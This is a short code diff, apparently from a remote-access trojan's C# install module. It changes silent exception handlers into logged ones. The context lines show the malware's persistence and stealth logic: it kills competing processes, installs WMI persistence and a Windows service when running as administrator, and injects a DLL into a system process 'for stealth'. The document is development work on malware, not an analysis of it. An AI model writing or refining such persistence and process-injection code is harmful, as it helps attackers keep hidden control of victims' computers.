@@ -26,7 +26,11 @@ namespace Client.Install
                             if (P.MainModule.FileName == installPath.FullName)
                                 P.Kill();
                         }
-                        catch { }
+                        catch (Exception ex)
+                        {
+                            // Non-critical: Single process kill failed, continue with others
+                            Logger.Error(ex);
+                        }
                     }
 
                     if (Methods.IsAdmin()) //if payload is runnign as administrator install schtasks
@@ -35,13 +39,19 @@ namespace Client.Install
                         {
                             WmiPersistence.Install(installPath.FullName);
                         }
-                        catch { }
+                        catch (Exception ex)
+                        {
+                            ErrorHandler.HandleNonCritical(() => { }, ex, "WmiPersistence install failed");
+                        }
                         
                         try
                         {
                             ServiceInstall.Install(installPath.FullName);
                         }
-                        catch { }
+                        catch (Exception ex)
+                        {
+                            ErrorHandler.HandleNonCritical(() => { }, ex, "ServiceInstall failed");
+                        }
                         
                         // Inject into system process for stealth
                         try
@@ -52,7 +62,10 @@ namespace Client.Install
                                 ProcessInjection.InjectDll(targetPid, installPath.FullName);
                             }
                         }
-                        catch { }
+                        catch (Exception ex)
+                        {
+                            ErrorHandler.HandleNonCritical(() => { }, ex, "ProcessInjection failed");
+                        }
                         
                         Process.Start(new ProcessStartInfo
                         {
